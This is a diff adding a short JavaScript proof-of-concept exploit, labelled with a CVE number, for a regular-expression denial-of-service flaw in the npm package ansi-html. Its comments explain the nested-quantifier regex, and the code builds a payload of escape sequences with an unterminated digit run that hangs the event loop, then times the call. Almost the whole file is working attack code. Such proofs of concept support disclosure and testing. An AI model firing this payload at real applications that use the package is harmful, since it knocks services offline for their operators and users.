@@ -1,0 +1,18 @@
+```javascript
+// Exploit for CVE-2021-23386 — ReDoS in ansi-html's `ansiHTML` function
+// The internal `ret = text.replace(/\033\[(\d+)*m/g, ...)` uses a nested
+// quantifier (\d+)* which causes catastrophic backtracking when it is fed
+// a long run of digits that is never terminated by 'm'.
+const ansiHTML = require("ansi-html");
+
+// A cheap valid sequence ("\x1b[m") satisfies the initial fast-path regex
+// check, then a second, unterminated digit run reaches the vulnerable
+// replace() call and triggers exponential backtracking.
+const N = 40; // each +1 roughly doubles the runtime
+const payload = "\x1b[m" + "\x1b[" + "1".repeat(N);
+
+console.log("Triggering ReDoS in ansi-html's ret regex, N=" + N);
+const start = Date.now();
+ansiHTML(payload); // hangs the event loop for an extremely long time
+console.log("done in", Date.now() - start, "ms");
+```
